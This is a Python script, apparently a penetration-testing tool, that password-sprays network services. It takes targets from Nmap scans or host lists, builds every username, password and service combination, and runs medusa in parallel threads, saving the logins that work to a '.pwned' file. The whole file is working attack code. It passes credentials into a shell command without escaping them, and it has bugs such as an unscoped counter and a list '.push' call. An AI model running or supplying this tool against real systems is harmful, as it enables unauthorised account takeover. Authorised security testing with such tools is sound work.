#!/usr/bin/env python3

import argparse
import concurrent.futures
import threading
import csv
import os
import json

from pathlib import Path
from tqdm import tqdm

from colorama import Fore
from colorama import Style

from libnmap.parser import NmapParser

parser = argparse.ArgumentParser()
parser.add_argument('-x', help='Nmap file to scan for inputs')
parser.add_argument('-iL', help='Take pre-permutations as input (must be generated with -g)')
parser.add_argument('-H', help='Hosts to spray against.')
parser.add_argument('-U', help='Username file spray (username per newline)')
parser.add_argument('-P', help='Password file spray (username per newline)')
parser.add_argument('--protocols', help='Protocols to spray')
parser.add_argument('--generate',action='store_true', help='Only generate permutations')
parser.add_argument('--threads', default=25, help='Threads to spray')
parser.add_argument('-o', default='gorgo.log', help='Output filename')
parser.add_argument('--run', action='store_true', help='Run spray')
parser.add_argument('--random', help='Randomize target list')
args = parser.parse_args()

thread_local = threading.local()
threads = 25
pwned = 0
outfile  = args.o
pbar = tqdm(total=100)

def auth_attempt(attempt):
    ip = attempt["ip"]
    username = attempt["username"]
    password = attempt["password"]
    service = attempt["service"]
    port = attempt["port"]
    pbar.update(1)
    pbar.refresh()

    tqdm.write(f"[{Fore.GREEN}INF{Style.RESET_ALL}] {Fore.BLUE}Trying: {service}://{username}:{password}@{ip}:{port}{Style.RESET_ALL}")

    output = os.popen(f'medusa -b -h {ip} -u "{username}" -p "{password}" -M "{service}" -n "{port}" 2>&1').read()
    with open(outfile, 'a') as f:
        f.write(output + os.linesep)
        f.close()

    if "[SUCCESS]" in output:
        tqdm.write(f'{Fore.GREEN}AUTHENTICATION SUCCESSFUL! {Fore.YELLOW}{service}://{username}:{password}@{ip}:{port}{Style.RESET_ALL}')
        print(f'{Fore.GREEN}{output}{Style.RESET_ALL}')
        with open(outfile+'.pwned', 'a') as f:
            f.write(json.dumps(attempt) + os.linesep)
            f.close()
        pwned += 1
    else:   
        tqdm.write(f'{Fore.BLUE}{output}{Style.RESET_ALL}')

def bulk_attempts(attempts):
    tqdm.write(f'{Fore.BLUE}Starting password spray against {len(attempts)} total hosts using {threads} threads...{Style.RESET_ALL}')
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(auth_attempt, attempts)

    tqdm.write(f'{Fore.GREEN}Spray complete against {len(attempts)} total hosts!{Style.RESET_ALL}')
    tqdm.write(f'{Fore.RED}Discovered {pwned} user accounts!{Style.RESET_ALL}')   

def parse_row(row):
    ip = row[0]
    username = row[1]
    password = row[2]
    service = row[3]
    port = row[4]

    return {'ip':ip, 'username':username, 'password':password, 'service':service, 'port':port}

def input_csv(filename):
    with open(filename, newline="") as csvfile:
        reader = csv.reader(csvfile, delimiter=',', quotechar='"') 
        attempts = []

        for row in reader:
            attempts.push(parse_row(row))

        bulk_attempts(attempts)

def generate_permutations(hosts, usernames, passwords, protocols):
    attempts = []
    for password in passwords:
        for username in usernames:
            for protocol in protocols:
                    service = protocol.split(":")[0]
                    port = protocol.split(":")[1]
                    for host in hosts:
                        attempts.append({
                        'ip':host,
                        'username':username,
                        'password':password, 
                        'service':service,
                        'port':port})

    return attempts

def generate_permutations_nmap(hosts, usernames, passwords, protocols):
    attempts = []

    for password in passwords:
        for username in usernames:
            for host in hosts:
                if host["service"] in protocols:
                    attempts.append({'ip':host["ip"], 'username':username, 'password':password, 'service':host["service"], 'port':host["port"]})

    return attempts

def save_to_csv(data, filename):
    with open(filename, 'w', newline='') as csvfile:
        fieldnames = data[0].keys()
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames, quoting=csv.QUOTE_ALL)
        writer.writeheader()
        for attempt in data:
            writer.writerow(attempt)

    print(f'{Fore.GREEN}Saved %i permutations to %s {Style.RESET_ALL}' % (len(data), filename))

def parse_file(filename):
    if Path(filename).is_file():
        with open(filename, 'r') as f:
            return f.read().split('\n')
    else:
         print(f'{Fore.RED}Error: File %s not found{Style.RESET_ALL}' % (filename))
         quit()

def parse_nmap(filename, protocols):
    nmap = NmapParser.parse_fromfile(filename)
    attack_vectors = []

    for host in nmap.hosts:
        for service in host.services:
            svc = service.service.lower()
            if service.state == 'open':
                if svc in protocols:
                    attack_vectors.append({'ip':host.address, 'port':service.port, 'service':svc})

    return attack_vectors

def parse_csv(filename):
    attempts = []
    with open(filename, newline='') as csvfile:
        reader = csv.reader(csvfile, delimiter=',', quotechar='"')
        
        for row in reader:
            attempts.append({'ip':row[0], 'username':row[1], 'password':row[2], 'service':row[3], 'port':row[4]})

    return attempts

def main():
    if (args.generate or args.run) and (args.U and args.P and args.protocols):
        usernames = parse_file(args.U)
        passwords = parse_file(args.P)
        protocols = args.protocols.split(",")

        if args.x:
            hosts = parse_nmap(args.x, protocols)
            attempts = generate_permutations_nmap(hosts, usernames, passwords, protocols)
        elif args.iL:
            attempts = parse_csv(args.iL)
        elif args.H:
            hosts = parse_file(args.H)
            attempts = generate_permutations(hosts, usernames, passwords, protocols)

        if args.run:
            pbar.total = len(attempts)
            pbar.refresh()
            bulk_attempts(attempts)
        elif args.generate:
            save_to_csv(attempts, args.o)
    else:
        parser.print_help()

main()


